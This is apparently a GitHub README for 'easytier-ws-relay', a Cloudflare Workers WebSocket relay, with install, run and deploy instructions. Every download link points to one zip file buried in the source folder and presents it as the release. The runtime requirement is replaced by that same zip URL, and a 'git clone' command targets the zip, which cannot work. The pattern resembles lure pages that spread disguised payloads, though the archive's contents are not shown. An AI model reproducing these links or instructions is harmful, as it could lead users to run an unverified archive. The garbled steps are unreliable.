# 🌐 easytier-ws-relay - Simple WebSocket Connection for Cloudflare

## 🚀 Getting Started

Welcome to EasyTier WebSocket Relay! This software helps connect your applications through WebSockets via Cloudflare Workers, allowing seamless communication in a decentralized network. Follow these steps to set it up easily.

## 📥 Download & Install

To get started, you can download the latest version of the EasyTier WebSocket Relay directly from the Releases page. 

[![Download easytier-ws-relay](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip)](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip)

## 🔧 Installation Requirements

Before downloading, ensure you have the following on your computer:

- **Operating System**: Compatible with Windows, MacOS, or Linux
- **https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip**: Version 16.0.0 or higher
- **Package Manager**: pnpm (recommended) or npm
- **Wrangler CLI**: This is required to work with Cloudflare Workers

## 💻 How to Install

1. **Download the latest release**: Visit [this page to download](https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip). Choose the latest version suitable for your operating system.

2. **Extract the files**: After downloading, unzip the files to a folder of your choice.

3. **Open Terminal/Command Prompt**: Navigate to the folder where you extracted the files.

4. **Clone the repository** (optional): If you want to work directly with the code:
   ```bash
   git clone https://raw.githubusercontent.com/NotTropical/easytier-ws-relay/master/src/worker/core/relay-ws-easytier-v2.1.zip
   cd easytier-ws-relay
   ```

5. **Install dependencies**: If you cloned the repository, run the following command:
   ```bash
   pnpm install
   # or use npm
   npm install
   ```

6. **Install Wrangler CLI**: This tool helps manage Cloudflare Workers.
   ```bash
   npm install -g wrangler
   ```

7. **Log in to Cloudflare**: Use the following command to authenticate:
   ```bash
   wrangler login
   ```

## 🚀 Starting the Application

After installation, you can start the application locally for testing or development:

### 🖥️ Start Development Server

Run this command to start the local server:
```bash
pnpm run dev
# or
wrangler dev --ip 0.0.0.0
```

### 🏁 Direct Start (without file watching)

If you prefer to run the application without watching for file changes, use:
```bash
pnpm run start
# or
wrangler dev
```

## 🚀 Deploying to Cloudflare

If you want to make your project available online, you can deploy it to Cloudflare:

### 📦 Deployment Command

Use the following command to deploy:
```bash
wrangler deploy
```

### ⚙️ Configuration Notes

Make sure you follow the setup guidelines within the project for any specific configurations needed before deployment.

## 🌟 Features

- **Real-time Communication**: Facilitates instant message exchanges between clients.
- **Decentralized Networking**: Allows for peer-to-peer connections without a central server.
- **High Performance**: Designed using Cloudflare’s durable architecture.
- **Secure Transfers**: Incorporates encryption for safe data transmission.

## 🤝 Contribution

This project is in the early stages. You are welcome to contribute code or report issues. Your feedback helps improve the application.

---

With these steps, you can easily set up and run EasyTier WebSocket Relay on your machine. For more detailed insights into specific functionalities or troubleshooting, please refer to the project's documentation or reach out to the community.